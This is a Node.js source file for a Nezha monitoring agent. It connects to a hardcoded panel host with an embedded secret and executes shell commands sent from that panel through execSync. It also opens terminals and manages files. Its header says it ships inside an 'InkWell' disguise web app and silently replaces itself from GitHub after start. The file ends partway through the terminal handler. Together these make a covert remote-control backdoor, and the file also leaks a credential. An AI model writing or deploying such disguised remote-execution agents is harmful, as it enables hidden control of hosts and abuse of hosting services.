/**
 * 纯 Node.js 哪吒探针 + IOStream 终端/文件管理 + InkWell 伪装 Web 应用
 * - 无外部依赖 (仅使用 Node.js 内置模块)
 * - 启动前先获取公网 IP，生成固定 UUID
 * - 使用 Node.js 内置 http2 模块连接哪吒面板 gRPC
 * - 支持自动端口探测、自动重连
 * - 支持终端任务 (taskType 5) — 通过 /usr/bin/script 创建 PTY
 * - 支持文件管理任务 (taskType 6) — 通过 IOStream 自定义协议 (NZFN/NZTD/NZUP/NERR)
 * - 支持命令执行任务 (taskType 4/15)
 * - 内嵌 InkWell 伪装 Web 应用 (纯 http, 零外部依赖)
 * - 启动后 10 秒自动从 GitHub 拉取最新版本覆盖自身 (一次性)
 */

const http2 = require('http2');
const https = require('https');
const http = require('http');
const crypto = require('crypto');
const os = require('os');
const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawn, execSync } = require('child_process');

// ==================== 配置 ====================
const NZ_SERVER = 'nz.zxydk1715.dpdns.org:443';
const NZ_TLS    = true;
const NZ_SECRET = 'BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL';
const AGENT_VERSION = '2.2.2';
const REPORT_DELAY = 3;       // 秒，State 上报间隔
const GEOIP_PERIOD = 1800;    // 秒，GeoIP 上报间隔 (30分钟)
const HOST_PERIOD = 600;      // 秒，Host 重新上报间隔 (10分钟)
const PING_PERIOD = 10;       // 秒，HTTP/2 PING 间隔

// InkWell Web 应用配置
const INKWELL_PORT = process.env.PORT || 3000;
const INKWELL_USER = process.env.INKWELL_USER || 'admin';
const INKWELL_PASS = process.env.INKWELL_PASS || 'inkwell2024';
const INKWELL_DATA_FILE = path.join(__dirname, '.inkwell_journal.json');

// ==================== 全局状态 ====================
let running = true;
let h2session = null;
let nezhaPureH2Session = null;          // 别名: 指向 h2session，供 IOStream 任务使用
let stateStream = null;
let taskStream = null;
let stateTimer = null;
let geoipTimer = null;
let hostTimer = null;
let pingTimer = null;
let reconnectTimer = null;
let reopenTimer = null;
let restartAttempts = 0;
let isReconnecting = false;
let sessionAlive = false;
let currentUUID = '';
let currentIP = '';
let currentAuthHeaders = null;          // 当前的鉴权头，供 IOStream 任务使用
let prevCpuTotal = 0;
let prevCpuBusy = 0;
let lastNetIn = 0;
let lastNetOut = 0;
let lastNetTime = 0;

// 活动的终端会话和文件管理会话
const nezhaPureActiveTerminals = new Map();
const nezhaPureActiveFMSessions = new Map();

// ==================== 信号处理 ====================
process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);
process.on('SIGHUP', () => {}); // 忽略
process.on('uncaughtException', (err) => {
    console.error(`[Nezha] 未捕获异常: ${err.message}\n${err.stack}`);
});
process.on('unhandledRejection', (reason) => {
    console.error(`[Nezha] 未处理的 Promise 拒绝: ${reason}`);
});

function gracefulShutdown() {
    console.log('[Nezha] 正在关闭...');
    running = false;
    try { cleanupSession(); } catch(e) {}
    process.exit(0);
}

// ==================== UUID 生成 (从 IP 生成固定 UUID) ====================
function generateIPBasedUUID(ip) {
    const seed = ip || 'default';
    const h = crypto.createHash('sha256').update('nezha-agent-uuid:' + seed).digest();
    const p1 = h.readUInt32BE(0);
    const p2 = h.readUInt16BE(4);
    const p3raw = h.readUInt16BE(6);
    const p3 = (p3raw & 0x0FFF) | 0x4000; // UUID v4
    const p4raw = h.readUInt16BE(8);
    const p4 = (p4raw & 0x3FFF) | 0x8000; // RFC 4122
    const p5 = Buffer.from([h[10], h[11], h[12], h[13], h[14], h[15]]).toString('hex');
    return `${p1.toString(16).padStart(8, '0')}-${p2.toString(16).padStart(4, '0')}-${p3.toString(16).padStart(4, '0')}-${p4.toString(16).padStart(4, '0')}-${p5}`;
}

// ==================== 获取公网 IP ====================
function getPublicIP() {
    return new Promise((resolve) => {
        const urls = [
            { url: 'https://api.ipify.org', host: 'api.ipify.org', path: '/', tls: true },
            { url: 'https://ifconfig.me/ip', host: 'ifconfig.me', path: '/ip', tls: true },
            { url: 'https://ipinfo.io/ip', host: 'ipinfo.io', path: '/ip', tls: true },
            { url: 'https://icanhazip.com', host: 'icanhazip.com', path: '/', tls: true },
        ];
        let resolved = false;
        for (const u of urls) {
            const mod = u.tls ? https : http;
            const req = mod.get(u.url, { headers: { 'User-Agent': 'curl/7.88.1' }, timeout: 5000, rejectUnauthorized: false }, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    if (resolved) return;
                    const ip = data.trim();
                    if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
                        resolved = true;
                        resolve(ip);
                    }
                });
            });
            req.on('error', () => {});
            req.on('timeout', () => { req.destroy(); });
        }
        setTimeout(() => { if (!resolved) resolve(''); }, 10000);
    });
}

// ==================== Protobuf 编码器 (V100 版本, 含 frame/unframe/bytes) ====================
const PB = {
    encodeVarint(val) {
        if (typeof val === 'number' && !Number.isInteger(val)) val = Math.floor(Math.max(0, val));
        val = BigInt(val);
        if (val < 0n) val = val + (1n << 64n);
        const bytes = [];
        do {
            let byte = Number(val & 0x7fn);
            val >>= 7n;
            if (val > 0n) byte |= 0x80;
            bytes.push(byte);
        } while (val > 0n);
        return Buffer.from(bytes);
    },
    decodeVarint(buf, off) {
        let val = 0n, shift = 0n;
        while (off < buf.length) {
            const b = BigInt(buf[off]);
            val |= (b & 0x7fn) << shift;
            off++;
            if (!(b & 0x80n)) break;
            shift += 7n;
        }
        return { val: Number(val), off };
    },
    tag(fn, wt) { return this.encodeVarint((fn << 3) | wt); },
    uint64(fn, v) { return Buffer.concat([this.tag(fn, 0), this.encodeVarint(v || 0)]); },
    double(fn, v) {
        const b = Buffer.alloc(8);
        b.writeDoubleLE(v || 0, 0);
        return Buffer.concat([this.tag(fn, 1), b]);
    },
    string(fn, v) {
        if (!v) return Buffer.alloc(0);
        const s = Buffer.from(String(v), 'utf8');
        return Buffer.concat([this.tag(fn, 2), this.encodeVarint(s.length), s]);
    },
    bytes(fn, v) {
        if (!v || !v.length) return Buffer.alloc(0);
        return Buffer.concat([this.tag(fn, 2), this.encodeVarint(v.length), v]);
    },
    repString(fn, arr) {
        if (!arr || !arr.length) return Buffer.alloc(0);
        return Buffer.concat(arr.map(v => this.string(fn, v)));
    },
    repDouble(fn, arr) {
        if (!arr || !arr.length) return Buffer.alloc(0);
        return Buffer.concat(arr.map(v => this.double(fn, v)));
    },
    msg(parts) { return Buffer.concat(parts.filter(p => p && p.length > 0)); },
    frame(msgBuf) {
        const header = Buffer.alloc(5);
        header[0] = 0;
        header.writeUInt32BE(msgBuf.length, 1);
        return Buffer.concat([header, msgBuf]);
    },
    unframe(buf) {
        const frames = [];
        let off = 0;
        while (off + 5 <= buf.length) {
            const compressed = buf[off];
            const len = buf.readUInt32BE(off + 1);
            off += 5;
            if (off + len > buf.length) break;
            frames.push(buf.slice(off, off + len));
            off += len;
        }
        return frames;
    }
};

// ==================== 哪吒消息编码 ====================
const NezhaMsg = {
    encodeHost(info) {
        return PB.msg([
            PB.string(1, info.platform),
            PB.string(2, info.platformVersion),
            PB.repString(3, info.cpu || []),
            PB.uint64(4, info.memTotal),
            PB.uint64(5, info.diskTotal),
            PB.uint64(6, info.swapTotal),
            PB.string(7, info.arch),
            PB.string(8, info.virtualization),
            PB.uint64(9, info.bootTime),
            PB.string(10, info.version || AGENT_VERSION),
            PB.repString(11, info.gpu || []),
        ]);
    },
    encodeState(s) {
        return PB.msg([
            PB.double(1, s.cpu),
            PB.uint64(2, Math.round(s.memUsed) || 0),
            PB.uint64(3, s.swapUsed),
            PB.uint64(4, s.diskUsed),
            PB.uint64(5, s.netInTransfer),
            PB.uint64(6, s.netOutTransfer),
            PB.uint64(7, Math.round(s.netInSpeed) || 0),
            PB.uint64(8, Math.round(s.netOutSpeed) || 0),
            PB.uint64(9, s.uptime),
            PB.double(10, s.load1),
            PB.double(11, s.load5),
            PB.double(12, s.load15),
            PB.uint64(13, s.tcpConnCount),
            PB.uint64(14, s.udpConnCount),
            PB.uint64(15, s.processCount),
            PB.repDouble(17, s.gpu || []),
        ]);
    },
    encodeTaskResult(r) {
        return PB.msg([
            PB.uint64(1, r.id),
            PB.uint64(2, r.type),
            PB.double(3, r.delay || 0),
            PB.string(4, r.data || ''),
            PB.uint64(5, r.successful ? 1 : 0),
        ]);
    },
    encodeGeoIP(ipv4, ipv6) {
        const ipFields = [];
        if (ipv4) ipFields.push(PB.string(1, ipv4));
        if (ipv6) ipFields.push(PB.string(2, ipv6));
        const ipBuf = PB.msg(ipFields);
        return PB.msg([
            PB.uint64(1, ipv6 ? 1 : 0),
            PB.bytes(2, ipBuf),
        ]);
    },
};

// ==================== 系统信息收集 ====================
function readFileSafe(p) {
    try { return fs.readFileSync(p, 'utf8'); } catch(e) { return ''; }
}

function getDiskCapacity() {
    let diskTotal = 0, diskUsed = 0;
    try {
        if (fs.statfsSync) {
            const stat = fs.statfsSync('/');
            diskTotal = stat.blocks * stat.bsize;
            diskUsed = (stat.blocks - stat.bfree) * stat.bsize;
        }
    } catch(e) {}
    if (!diskTotal) {
        const altMounts = ['/data', '/overlay', '/mnt/data', '/host'];
        for (const m of altMounts) {
            try {
                if (fs.existsSync(m) && fs.statfsSync) {
                    const stat = fs.statfsSync(m);
                    const total = stat.blocks * stat.bsize;
                    if (total > diskTotal) { diskTotal = total; diskUsed = (stat.blocks - stat.bfree) * stat.bsize; }
                }
            } catch(e) {}
        }
    }
    return { diskTotal, diskUsed };
}

function collectHost() {
    const isWin = os.platform() === 'win32';

    let cpuInfo = [];
    try {
        const cpus = os.cpus();
        const cpuModelSet = new Set(cpus.map(c => c.model));
        cpuInfo = [...cpuModelSet];
    } catch(e) {}

    let memTotalValue = os.totalmem();
    let { diskTotal } = getDiskCapacity();

    let swapTotal = 0;
    try {
        if (!isWin) {
            const meminfo = readFileSafe('/proc/meminfo');
            const swapMatch = meminfo.match(/SwapTotal:\s+(\d+)/);
            if (swapMatch) swapTotal = parseInt(swapMatch[1]) * 1024;
        }
    } catch(e) {}

    let virtualization = '';
    try {
        if (!isWin) {
            try {
                const cgroup = readFileSafe('/proc/1/cgroup');
                if (cgroup.includes('docker') || cgroup.includes('/docker/')) virtualization = 'docker';
                else if (cgroup.includes('lxc')) virtualization = 'lxc';
                else if (cgroup.includes('kubepods')) virtualization = 'kvm';
            } catch(e) {}
            if (!virtualization) {
                try { if (fs.existsSync('/.dockerenv')) virtualization = 'docker'; } catch(e) {}
            }
            if (!virtualization) {
                try {
                    const product = readFileSafe('/sys/class/dmi/id/product_name').trim();
                    if (product.toLowerCase().includes('kvm') || product.toLowerCase().includes('qemu')) virtualization = 'kvm';
                    else if (product.toLowerCase().includes('vmware')) virtualization = 'vmware';
                    else if (product.toLowerCase().includes('virtualbox')) virtualization = 'virtualbox';
                    else if (product.toLowerCase().includes('xen')) virtualization = 'xen';
                } catch(e) {}
            }
            if (!virtualization) {
                try {
                    const cpuinfo = readFileSafe('/proc/cpuinfo');
                    if (cpuinfo.includes('hypervisor')) virtualization = 'kvm';
                } catch(e) {}
            }
            if (!virtualization) virtualization = 'unknown';
        }
    } catch(e) { virtualization = 'unknown'; }

    let bootTime = 0;
    try {
        if (!isWin) {
            let isDocker = false;
            try { if (fs.existsSync('/.dockerenv')) isDocker = true; } catch(e) {}
            if (!isDocker) {
                try {
                    const cgroup = readFileSafe('/proc/1/cgroup');
                    if (cgroup.includes('docker') || cgroup.includes('/docker/')) isDocker = true;
                } catch(e) {}
            }
            if (!isDocker) {
                const procStat = readFileSafe('/proc/stat');
                const btimeMatch = procStat.match(/btime\s+(\d+)/);
                if (btimeMatch) bootTime = parseInt(btimeMatch[1]);
            }
            if (!bootTime) bootTime = Math.floor(Date.now() / 1000 - os.uptime());
        }
    } catch(e) {
        bootTime = Math.floor(Date.now() / 1000 - os.uptime());
    }

    let archValue = '';
    const nodeArch = os.arch();
    if (nodeArch === 'x64') archValue = 'x86_64';
    else if (nodeArch === 'arm64') archValue = 'aarch64';
    else if (nodeArch === 'arm') archValue = 'armv7l';
    else if (nodeArch === 'ia32') archValue = 'i386';
    else archValue = nodeArch;

    let gpuInfo = [];
    try {
        if (!isWin) {
            const drmDir = '/sys/class/drm';
            if (fs.existsSync(drmDir)) {
                const devs = fs.readdirSync(drmDir);
                for (const d of devs) {
                    try {
                        const deviceDir = path.join(drmDir, d, 'device');
                        if (fs.existsSync(deviceDir)) {
                            const uevent = readFileSafe(path.join(deviceDir, 'uevent'));
                            const pciMatch = uevent.match(/PCI_ID=([\w:]+)/);
                            if (pciMatch) gpuInfo.push(d + '(' + pciMatch[1] + ')');
                        }
                    } catch(e) {}
                }
            }
        }
    } catch(e) {}

    let platformName = os.type();
    let platformVersion = os.release();
    try {
        if (!isWin) {
            const osRelease = readFileSafe('/etc/os-release');
            const idMatch = osRelease.match(/^ID=(.+)$/m);
            const verMatch = osRelease.match(/^VERSION_ID=(.+)$/m);
            if (idMatch) platformName = idMatch[1].trim().replace(/^["']|["']$/g, '');
            if (verMatch) platformVersion = verMatch[1].trim().replace(/^["']|["']$/g, '');
        }
    } catch(e) {}

    return {
        platform: platformName,
        platformVersion: platformVersion,
        cpu: cpuInfo,
        memTotal: memTotalValue,
        diskTotal: diskTotal,
        swapTotal: swapTotal,
        arch: archValue,
        virtualization: virtualization,
        bootTime: bootTime || Math.floor(Date.now() / 1000 - os.uptime()),
        version: AGENT_VERSION,
        gpu: gpuInfo,
        ip: currentIP,
    };
}

function collectState() {
    const isWin = os.platform() === 'win32';

    let cpuPercent = 0;
    try {
        if (!isWin) {
            const procStat = readFileSafe('/proc/stat');
            const cpuLine = procStat.split('\n')[0];
            const fields = cpuLine.match(/cpu\s+(.*)/);
            if (fields) {
                const v = fields[1].trim().split(/\s+/).map(Number);
                const user = v[0] || 0, nice = v[1] || 0, system = v[2] || 0;
                const idle = v[3] || 0, iowait = v[4] || 0, irq = v[5] || 0;
                const softirq = v[6] || 0, steal = v[7] || 0;
                const guest = v[8] || 0, guestNice = v[9] || 0;
                let total = user + nice + system + idle + iowait + irq + softirq + steal + guest + guestNice;
                total -= guest + guestNice;
                const busy = total - idle - iowait;
                if (prevCpuTotal > 0) {
                    const totalDiff = total - prevCpuTotal;
                    const busyDiff = busy - prevCpuBusy;
                    if (totalDiff > 0) cpuPercent = Math.max(0, Math.min(100, (busyDiff / totalDiff) * 100));
                }
                prevCpuTotal = total;
                prevCpuBusy = busy;
            }
        } else {
            const cpus = os.cpus();
            if (collectState._prevCpus) {
                let totalDiff = 0, idleDiff = 0;
                for (let i = 0; i < cpus.length; i++) {
                    const prev = collectState._prevCpus[i], curr = cpus[i];
                    if (!prev || !prev.times) continue;
                    totalDiff += Object.values(curr.times).reduce((a, b) => a + b, 0) - Object.values(prev.times).reduce((a, b) => a + b, 0);
                    idleDiff += (curr.times.idle || 0) - (prev.times.idle || 0);
                }
                if (totalDiff > 0) cpuPercent = Math.max(0, Math.min(100, ((totalDiff - idleDiff) / totalDiff) * 100));
            }
            collectState._prevCpus = cpus;
        }
    } catch(e) {}

    let memTotal = os.totalmem();
    let memUsed = memTotal - os.freemem();
    let swapUsed = 0, swapTotal = 0;
    try {
        if (!isWin) {
            const meminfo = readFileSafe('/proc/meminfo');
            const memTotalMatch = meminfo.match(/MemTotal:\s+(\d+)/);
            const memAvailMatch = meminfo.match(/MemAvailable:\s+(\d+)/);
            if (memTotalMatch) memTotal = parseInt(memTotalMatch[1]) * 1024;
            if (memAvailMatch) {
                memUsed = memTotal - parseInt(memAvailMatch[1]) * 1024;
            } else {
                const memFreeMatch = meminfo.match(/MemFree:\s+(\d+)/);
                const buffersMatch = meminfo.match(/Buffers:\s+(\d+)/);
                const cachedMatch = meminfo.match(/Cached:\s+(\d+)/);
                const sReclaimableMatch = meminfo.match(/SReclaimable:\s+(\d+)/);
                let available = parseInt(memFreeMatch?.[1]) || 0;
                available += parseInt(buffersMatch?.[1]) || 0;
                available += parseInt(cachedMatch?.[1]) || 0;
                available += parseInt(sReclaimableMatch?.[1]) || 0;
                memUsed = Math.max(0, memTotal - available * 1024);
            }
            const swFree = parseInt(meminfo.match(/SwapFree:\s+(\d+)/)?.[1]) || 0;
            const swTotalVal = parseInt(meminfo.match(/SwapTotal:\s+(\d+)/)?.[1]) || 0;
            swapTotal = swTotalVal * 1024;
            swapUsed = (swTotalVal - swFree) * 1024;
        }
    } catch(e) {}

    let { diskTotal: _dt, diskUsed } = getDiskCapacity();

    let netInTransfer = 0, netOutTransfer = 0, netInSpeed = 0, netOutSpeed = 0;
    try {
        if (!isWin) {
            const netDev = readFileSafe('/proc/net/dev');
            const lines = netDev.split('\n').slice(2);
            for (const line of lines) {
                const match = line.trim().match(/^\s*([^:]+):\s*(\d+)\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+(\d+)/);
                if (match && !['lo', 'tun', 'docker', 'veth', 'br-', 'vmbr', 'vnet', 'kube', 'Meta', 'tailscale', 'fw', 'tap'].some(skip => match[1].trim().startsWith(skip))) {
                    netInTransfer += parseInt(match[2]) || 0;
                    netOutTransfer += parseInt(match[3]) || 0;
                }
            }
            const now = Date.now();
            if (lastNetTime > 0 && now > lastNetTime) {
                const elapsed = (now - lastNetTime) / 1000;
                netInSpeed = Math.max(0, (netInTransfer - lastNetIn) / elapsed);
                netOutSpeed = Math.max(0, (netOutTransfer - lastNetOut) / elapsed);
            }
            lastNetIn = netInTransfer;
            lastNetOut = netOutTransfer;
            lastNetTime = now;
        }
    } catch(e) {}

    let tcpConnCount = 0, udpConnCount = 0;
    try {
        if (!isWin) {
            for (const tcpFile of ['/proc/net/tcp', '/proc/net/tcp6']) {
                try {
                    const data = readFileSafe(tcpFile);
                    const lines = data.split('\n').slice(1);
                    for (const line of lines) {
                        const parts = line.trim().split(/\s+/);
                        if (parts.length >= 4 && parts[3] === '01') tcpConnCount++;
                    }
                } catch(e) {}
            }
            for (const udpFile of ['/proc/net/udp', '/proc/net/udp6']) {
                try {
                    const data = readFileSafe(udpFile);
                    const lines = data.split('\n').slice(1);
                    for (const line of lines) {
                        const parts = line.trim().split(/\s+/);
                        if (parts.length >= 4) udpConnCount++;
                    }
                } catch(e) {}
            }
        }
    } catch(e) {}

    let processCount = 0;
    try {
        if (!isWin) {
            const procEntries = fs.readdirSync('/proc');
            for (const entry of procEntries) {
                if (/^\d+$/.test(entry)) processCount++;
            }
        }
    } catch(e) {}

    const loadAvg = os.loadavg();
    return {
        cpu: cpuPercent,
        memUsed,
        swapUsed,
        diskUsed,
        netInTransfer,
        netOutTransfer,
        netInSpeed,
        netOutSpeed,
        uptime: Math.floor(os.uptime()),
        load1: loadAvg[0],
        load5: loadAvg[1],
        load15: loadAvg[2],
        tcpConnCount,
        udpConnCount,
        processCount,
        gpu: [],
    };
}

// ==================== gRPC 通信 ====================
function sendUnary(h2, path, msgBuf, authHeaders) {
    return new Promise((resolve, reject) => {
        const headers = {
            ':method': 'POST',
            ':path': path,
            'content-type': 'application/grpc',
            'te': 'trailers',
            'grpc-encoding': 'identity',
            'grpc-accept-encoding': 'identity',
            'user-agent': `nezha-agent/${AGENT_VERSION}`,
            ...authHeaders,
        };
        const req = h2.request(headers);
        const respChunks = [];
        let resolved = false;
        req.on('response', (hdrs) => {
            const httpStatus = parseInt(hdrs[':status']);
            if (httpStatus && httpStatus !== 200) {
                if (httpStatus === 530 || hdrs['server'] === 'cloudflare') {
                    const errMsg = `HTTP ${httpStatus} — gRPC 被 Cloudflare 拦截! 请在 Cloudflare 面板开启 gRPC 支持，或使用直连地址`;
                    if (!resolved) { resolved = true; reject(new Error(errMsg)); }
                    return;
                }
                if (!resolved) { resolved = true; reject(new Error(`HTTP ${httpStatus}: 非 gRPC 响应，请检查面板地址和端口`)); }
                return;
            }
        });
        req.on('data', (chunk) => { if (!resolved) respChunks.push(chunk); });
        req.on('trailers', (trailers) => {
            if (resolved) return;
            resolved = true;
            const status = trailers['grpc-status'];
            if (status && status !== '0') {
                reject(new Error(`gRPC error ${status}: ${trailers['grpc-message'] || 'unknown'}`));
            } else {
                const fullBuf = Buffer.concat(respChunks);
                const frames = PB.unframe(fullBuf);
                resolve(frames.length > 0 ? frames[0] : null);
            }
        });
        req.on('error', (err) => { if (!resolved) { resolved = true; reject(err); } });
        req.end(PB.frame(msgBuf));
        setTimeout(() => {
            if (!resolved) {
                resolved = true;
                req.close(http2.constants.HTTP2_STREAM_CANCEL);
                reject(new Error('gRPC unary 请求超时(15s)'));
            }
        }, 15000);
    });
}

function openStream(h2, path, authHeaders, onData, onEnd) {
    const headers = {
        ':method': 'POST',
        ':path': path,
        'content-type': 'application/grpc',
        'te': 'trailers',
        'grpc-encoding': 'identity',
        'grpc-accept-encoding': 'identity',
        'user-agent': `nezha-agent/${AGENT_VERSION}`,
        ...authHeaders,
    };
    const stream = h2.request(headers);
    let streamBroken = false;
    let ended = false;
    const safeOnEnd = (info) => {
        if (ended) return;
        ended = true;
        try { stream.end(); } catch(e) {}
        if (onEnd) onEnd(info);
    };
    stream.on('response', (hdrs) => {
        const httpStatus = parseInt(hdrs[':status']);
        if (httpStatus && httpStatus !== 200) {
            streamBroken = true;
            safeOnEnd({ error: new Error(`HTTP ${httpStatus}`), cloudflare: httpStatus === 530 });
        }
    });
    stream.on('data', (chunk) => {
        if (streamBroken || ended) return;
        try {
            const frames = PB.unframe(chunk);
            frames.forEach(f => { if (onData) onData(f); });
        } catch(e) {}
    });
    stream.on('trailers', (trailers) => {
        if (streamBroken || ended) return;
        const grpcStatus = trailers['grpc-status'];
        const grpcMsg = trailers['grpc-message'] || '';
        if (grpcMsg.includes('UNIQUE constraint')) return;
        if (grpcStatus === '0') {
            console.log(`[Nezha] 流 ${path} 服务端关闭 (grpc-status:0)，将重开`);
        } else if (grpcStatus === '2' && grpcMsg === 'EOF') {
            console.log(`[Nezha] 流 ${path} 收到 EOF，将重开`);
        } else if (grpcStatus && grpcStatus !== '0') {
            console.log(`[Nezha] 流 ${path} gRPC错误: status=${grpcStatus} msg=${grpcMsg}`);
        }
        safeOnEnd(trailers);
    });
    stream.on('error', (err) => {
        console.log(`[Nezha] 流 ${path} 错误: ${err.message}`);
        safeOnEnd({ error: err });
    });
    stream.on('close', () => {
        if (!ended) {
            console.log(`[Nezha] 流 ${path} 意外关闭`);
            safeOnEnd({ closed: true });
        }
    });
    return stream;
}

// ==================== IOStream 打开函数 (V100 版本, 用于终端和文件管理) ====================
function nezhaPureOpenStream(h2session, path, authHeaders, onData, onEnd) {
    const headers = {
        ':method': 'POST',
        ':path': path,
        'content-type': 'application/grpc',
        'te': 'trailers',
        'grpc-encoding': 'identity',
        'grpc-accept-encoding': 'identity',
        'user-agent': `nezha-agent/${AGENT_VERSION}`,
        ...authHeaders,
    };
    const stream = h2session.request(headers);
    let streamBroken = false;
    stream.on('response', (hdrs) => {
        const httpStatus = parseInt(hdrs[':status']);
        if (httpStatus && httpStatus !== 200) {
            streamBroken = true;
            try { stream.end(); } catch(e) {}
            if (onEnd) onEnd({ error: new Error(`HTTP ${httpStatus}`), cloudflare: httpStatus === 530 });
        }
    });
    stream.on('data', (chunk) => {
        if (streamBroken) return;
        try {
            const frames = PB.unframe(chunk);
            frames.forEach(f => { if (onData) onData(f); });
        } catch(e) {}
    });
    stream.on('trailers', (trailers) => {
        if (streamBroken) return;
        const grpcStatus = trailers['grpc-status'];
        const grpcMsg = trailers['grpc-message'] || '';
        const isUniqueConstraint = grpcMsg.includes('UNIQUE constraint');
        if (grpcStatus && grpcStatus !== '0' && !(grpcStatus === '2' && grpcMsg === 'EOF') && !isUniqueConstraint) {
            console.log(`[Nezha] IOStream ${path} gRPC错误: status=${grpcStatus} msg=${grpcMsg}`);
        }
        if (isUniqueConstraint) {
            return;
        }
        if (onEnd) onEnd(trailers);
    });
    stream.on('error', (err) => {
        console.log(`[Nezha] IOStream ${path} 错误: ${err.message}`);
        if (onEnd) onEnd({ error: err });
    });
    return stream;
}

// ==================== 任务处理 ====================
function handleTaskData(frameData) {
    try {
        let taskId = 0, taskType = 0, taskDataStr = '';
        let off = 0;
        while (off < frameData.length) {
            const { val: tagVal, off: newOff1 } = PB.decodeVarint(frameData, off);
            off = newOff1;
            const fieldNum = tagVal >> 3;
            const wireType = tagVal & 0x07;
            if (wireType === 0) {
                const { val, off: newOff2 } = PB.decodeVarint(frameData, off);
                off = newOff2;
                if (fieldNum === 1) taskId = val;
                else if (fieldNum === 2) taskType = val;
            } else if (wireType === 2) {
                const { val: len, off: newOff3 } = PB.decodeVarint(frameData, off);
                off = newOff3;
                const strBytes = frameData.slice(off, off + len);
                off += len;
                if (fieldNum === 3) taskDataStr = strBytes.toString('utf8');
            } else {
                break;
            }
        }

        if (taskType === 1) handleHTTPTask(taskId, taskDataStr);
        else if (taskType === 2) handleICMPPingTask(taskId, taskDataStr);
        else if (taskType === 3) handleTCPPingTask(taskId, taskDataStr);
        else if (taskType === 7) { /* keepalive, 忽略 */ }
        else if (taskType === 4 || taskType === 15) { handleCommandTask(taskId, taskDataStr); }
        else if (taskType === 5) { handleTerminalTask(taskId, taskDataStr); }
        else if (taskType === 6) { handleFMTask(taskId, taskDataStr); }
    } catch(e) {}
}

function sendTaskResult(id, type, delay, data, successful) {
    try {
        if (taskStream && !taskStream.destroyed) {
            const buf = NezhaMsg.encodeTaskResult({ id, type, delay, data, successful });
            taskStream.write(PB.frame(buf));
        }
    } catch(e) {}
}

function handleHTTPTask(taskId, taskData) {
    let url = '';
    try {
        if (taskData.startsWith('{')) {
            const u = taskData.replace(/.*"url"\s*:\s*"([^"]+)".*/, '$1');
            if (u !== taskData) url = u; else url = taskData.trim();
        } else url = taskData.trim();
    } catch(e) { url = taskData.trim(); }
    if (!url) { sendTaskResult(taskId, 1, 0, 'URL empty', false); return; }
    const start = Date.now();
    const mod = url.startsWith('https') ? https : http;
    try {
        const req = mod.get(url, { timeout: 10000, rejectUnauthorized: false }, (res) => {
            let body = '';
            res.on('data', (chunk) => { body += chunk; });
            res.on('end', () => {
                const delay = Date.now() - start;
                sendTaskResult(taskId, 1, delay, res.statusCode + ' ' + (res.statusMessage || ''), res.statusCode >= 200 && res.statusCode < 400);
            });
        });
        req.on('error', (err) => { sendTaskResult(taskId, 1, Date.now() - start, err.message, false); });
        req.on('timeout', () => { req.destroy(); sendTaskResult(taskId, 1, Date.now() - start, 'timeout', false); });
    } catch(e) {
        sendTaskResult(taskId, 1, Date.now() - start, e.message, false);
    }
}

function handleICMPPingTask(taskId, taskData) {
    let host = taskData.trim();
    try { host = host.replace(/.*"host"\s*:\s*"([^"]+)".*/, '$1'); } catch(e) {}
    if (!host) { sendTaskResult(taskId, 2, 0, 'Host empty', false); return; }

    let totalDelay = 0, successCount = 0;
    const output = [];
    const doPing = (attempt) => {
        return new Promise((resolve) => {
            const start = Date.now();
            const socket = new net.Socket();
            socket.setTimeout(5000);
            socket.on('connect', () => {
                const delay = Date.now() - start;
                successCount++;
                totalDelay += delay;
                output.push(`icmp_seq=${attempt} time=${delay}ms`);
                socket.destroy();
                resolve(true);
            });
            socket.on('timeout', () => {
                output.push(`icmp_seq=${attempt} timeout`);
                socket.destroy();
                resolve(false);
            });
            socket.on('error', (err) => {
                output.push(`icmp_seq=${attempt} ${err.message}`);
                resolve(false);
            });
            socket.connect(80, host);
        });
    };

    (async () => {
        for (let i = 1; i <= 3; i++) {
            await doPing(i);
            if (i < 3) await new Promise(r => setTimeout(r, 100));
        }
        const avg = successCount > 0 ? totalDelay / successCount : 0;
        sendTaskResult(taskId, 2, avg,
            `PING ${host}: ${successCount}/3 reached, avg=${avg.toFixed(1)}ms\n${output.join('\n')}`,
            successCount > 0);
    })();
}

function handleTCPPingTask(taskId, taskData) {
    let host = ''; let port = 80;
    try {
        const pp = taskData.trim().split(':');
        host = pp[0].trim();
        if (pp.length > 1) port = parseInt(pp[1].trim()) || 80;
    } catch(e) { host = taskData.trim(); }
    if (!host) { sendTaskResult(taskId, 3, 0, 'Host empty', false); return; }
    const start = Date.now();
    const socket = new net.Socket();
    socket.setTimeout(5000);
    socket.on('connect', () => {
        sendTaskResult(taskId, 3, Date.now() - start, `${host}:${port} OK`, true);
        socket.destroy();
    });
    socket.on('timeout', () => {
        sendTaskResult(taskId, 3, Date.now() - start, `${host}:${port} timeout`, false);
        socket.destroy();
    });
    socket.on('error', (err) => {
        sendTaskResult(taskId, 3, Date.now() - start, `${host}:${port} ${err.message}`, false);
    });
    socket.connect(port, host);
}

// ==================== 命令执行任务 (taskType 4 / 15) ====================
function handleCommandTask(taskId, taskData) {
    let cmd = '', cwd = '/';
    try {
        const cfg = JSON.parse(taskData);
        cmd = cfg.command || cfg.cmd || '';
        cwd = cfg.cwd || cfg.dir || '/';
    } catch(e) {
        cmd = taskData.trim();
    }
    if (!cmd) {
        sendTaskResult(taskId, 4, 0, '命令为空', false);
        return;
    }
    const startTime = Date.now();
    try {
        const output = execSync(cmd, {
            timeout: 30000, encoding: 'utf8', cwd,
            maxBuffer: 1024 * 1024
        }).toString();
        const delay = Date.now() - startTime;
        sendTaskResult(taskId, 4, delay, output.substring(0, 4096), true);
    } catch(e) {
        const delay = Date.now() - startTime;
        const output = (e.stdout || '') + (e.stderr || '') || e.message;
        sendTaskResult(taskId, 4, delay, output.substring(0, 4096), false);
    }
}

// ==================== 终端任务 (taskType 5, 通过 IOStream + PTY) ====================
function handleTerminalTask(taskId, taskData) {
    try {
        let streamId = '';
        try {
            const parsed = JSON.parse(taskData);
            streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
        } catch(e) {
            streamId = taskData;
        }
        if (!streamId) {
            return;
        }

        const terminalKey = streamId;
        if (nezhaPureActiveTerminals.has(terminalKey)) return;

